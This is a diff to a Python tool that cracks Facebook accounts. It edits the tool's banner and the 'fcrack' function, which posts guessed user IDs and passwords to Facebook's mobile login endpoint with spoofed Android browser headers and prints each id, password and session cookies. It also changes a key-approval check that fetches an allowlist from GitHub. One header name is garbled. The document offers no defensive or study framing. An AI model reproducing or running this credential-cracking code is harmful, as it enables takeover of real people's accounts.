@@ -1104,7 +1104,7 @@ logo = """
 [•] \033[1;37mVERSION    :\033[1;32m 2.7\033[1;37m
 [•]\033[1;31m FOR\033[1;36m HATERS \033[1;34mWAIT AND \033[1;37mSEE
 [•] Will Update Every 2 Days  
-[•] FRIEND ROMI
+[•] HELPING GIRL 
 [•] YOUR MIND IS YOUR  BEST  WEAPON
 --------------------------------------------------             
  """
@@ -1480,7 +1480,7 @@ def fcrack(uid,pwx,tl):
     'dpr': '2',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-Rao.pyua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"Infinix X680"',
     'sec-ch-ua-platform': '"Android"',
@@ -1489,8 +1489,10 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1'
-    'user-agent':pro}
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+
             lo = session.post('https://mbasic.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             print(iid+'|'+pws+'|'+str(log_cookies))
@@ -1523,7 +1525,7 @@ def approval():
   id = "-".join(uuid)
 
   try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/APKII-BAJI-09/Baji/main/AprOVl.txt').text
+    httpCaht = requests.get('https://raw.githubusercontent.com/APKII-BAJI-09/Baji.Queen/main/AprOVl.txt').text
     if id in httpCaht:
       print("\33[1;32mYOUR KEY IS APPROVED.")
       msg = str(os.geteuid())
